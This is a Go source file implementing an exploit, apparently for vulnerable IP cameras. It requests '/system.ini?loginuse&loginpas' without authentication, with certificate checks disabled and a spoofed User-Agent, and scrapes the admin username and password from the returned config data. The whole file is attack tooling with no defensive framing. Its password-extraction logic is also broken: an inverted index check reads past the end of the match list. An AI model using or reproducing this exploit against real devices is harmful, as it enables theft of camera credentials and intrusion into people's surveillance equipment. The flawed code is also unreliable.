package camover

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"time"
)

type CamOver struct{}

func NewCamOver() *CamOver {
	return &CamOver{}
}

func (c *CamOver) Exploit(address string) (string, string, error) {
	username := "admin"

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Timeout:   time.Duration(3 * time.Second),
		Transport: transport,
	}

	url := fmt.Sprintf("http://%s/system.ini?loginuse&loginpas", address)

	request, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return "", "", err
	}

	request.Header.Set("User-Agent", "Mozilla/5.0")
	response, err := client.Do(request)
	if err != nil {
		return "", "", err
	}

	defer response.Body.Close()

    if response.StatusCode != http.StatusOK {
        return "", "", fmt.Errorf("unexpected status code: %d", response.StatusCode)
    }

	body, err := io.ReadAll(response.Body)
	if err != nil {
		return "", "", err
	}

	re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)
    matches := re.FindAllString(string(body), -1)

    for idx, matche := range matches {
        if matche == username {
            if idx + 1 == len(matches) {
                password := matches[idx + 1]
                return username, password, nil
            }
            return "", "", fmt.Errorf("password not found after username")
        }
    }

	return "", "", fmt.Errorf("username not found")
}
